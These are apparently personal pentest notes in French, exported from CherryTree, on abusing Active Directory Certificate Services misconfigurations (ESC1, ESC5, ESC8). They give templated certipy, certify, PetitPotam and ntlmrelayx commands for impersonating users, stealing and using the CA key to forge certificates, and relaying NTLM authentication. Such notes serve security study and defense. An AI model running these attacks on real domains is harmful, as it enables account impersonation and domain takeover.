<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ADCS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ADCS</h1><br/><p><h2>Intro</h2></p><p><ul><li>ADCS = role dispo pour un windows server qui lui permet d&#39;agir comme PKI (infra a clé punbliquie):<ul><li>PKI : apporte des fonctionalites de signatures digitale, certificats numeriques etc dans un env AD </li><li>vulnerabilities de specter ops en 2021</li></ul></li><li> certificat au forùmat x.509 est un document signé par une CA (autorité de certification) contennat<ul><li>clef publique</li><li>extensions permettant d&#39;elargir les fonctionnalit&quot;s (e.g Extended Key Usage qui restreint les utilisations possibles du certificat)</li><li></li></ul></li></ul><img src="images/466-1.png" alt="images/466-1.png" /> <ul><li>La génération de certificat se base sur un tempalte de certificaté qui hébérgé par un AD CS <ul><li>definit le type de certificat, utilisateurs autorisé pouvant l&#39;obtenir, extensions de certificats</li><li>ils peuvent être vulnérables s&#39;ils sont mal configurés </li></ul></li></ul></p><p></p><p><ul><li></li></ul></p><p></p><p></p><p></p><p><h2>Récupération et analyse des modeles de certificats</h2></p><p></p><p><img src="images/466-2.png" alt="images/466-2.png" /></p><p></p><p></p><p></p><p><h2>ESC1</h2></p><p><ul><li>Prérequis<ul><li>le template et le CA autorisent un enrollement par l&#39;attaquant (utilisateur non privilégié)</li><li>la requete de certificat (ECR) ne necessite pas une validation par un manager ou un nombre non null de signature (fonctionnement par defaut)</li><li>certificat peut être utilisé pour l&#39;authentification</li><li>le drapeu CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT est activé : permet a un user non privilgegié de rattacher un certificat à un autre utilisatue (peut être par défaut pour certains templates)</li></ul></li><li>exploit<ul><li>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca sever&gt; -template &#39;&lt;template name&gt; -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt;</li><li>certify.exe request /ca:&lt;server&gt;\&lt;ca_name&gt; /template:&quot;&lt;vulnerable template name&gt;&quot; /altname:&quot;Admin&quot;  </li></ul></li></ul><img src="images/466-3.png" alt="images/466-3.png" /></p><p></p><p></p><p></p><p><h2>ESC5</h2></p><p><ul><li>prérequis : defauts de conf plus generaux </li><li>exploit<ul><li>extraire la clef privé et le certifcat de la CA elle meme </li><li>une fois en possession du certificat et la clef privé on peut forger des certificats valides </li></ul></li></ul></p><p>   ◇<ul><li>certipy ca -backup -u &lt;user@domain&gt; -p &lt;pass&gt; -targetca server&gt; -ca &lt;ca name&gt;  </li></ul><img src="images/466-4.png" alt="images/466-4.png" /><ul><li>forge a certificate for another use </li><li>certify forge -ca-pfx &lt;pfx cert +private keyof ca&gt; -upn &lt;impersonated user@domain&gt; -subject &lt;impersanted user subject&gt;</li></ul><img src="images/466-5.png" alt="images/466-5.png" /> <ul><li>Post exploit <ul><li>we can also auth via private keys in AD </li></ul></li></ul></p><p></p><p></p><p></p><p><h2>ESC8</h2></p><p><ul><li>prérequis<ul><li>AD CS autorise enrollemùent HTTP sans mettre en place des protections contre le relai ntlm</li></ul></li><li>confirmation<ul><li>http(s)://&lt;caIP&gt;/certserv : interface bien present </li></ul></li></ul><img src="images/466-6.png" alt="images/466-6.png" /><ul><li>Exploit<ul><li><ul><li>attaquant relay une authentication valide vers la CA et obtiendera  un certificat du client </li><li>le compte machine du DC peut faire du DCSync =&gt; on coerce son auth via petitpotam or coercer (fyi : coercer inclus petitpotam)</li><li>petitpotam.py $IPAttacker $target </li></ul></li></ul></li></ul><img src="images/466-7.png" alt="images/466-7.png" /><ul><li>ntlmrelayx.py -t <a href="http://ipca/certserv/certfnsh.asp">http://ipca/certserv/certfnsh.asp</a> -smb2support --adcs --template &lt;templateName&gt;  </li><li></li></ul><img src="images/466-8.png" alt="images/466-8.png" /></p></div>
</body>
</html>
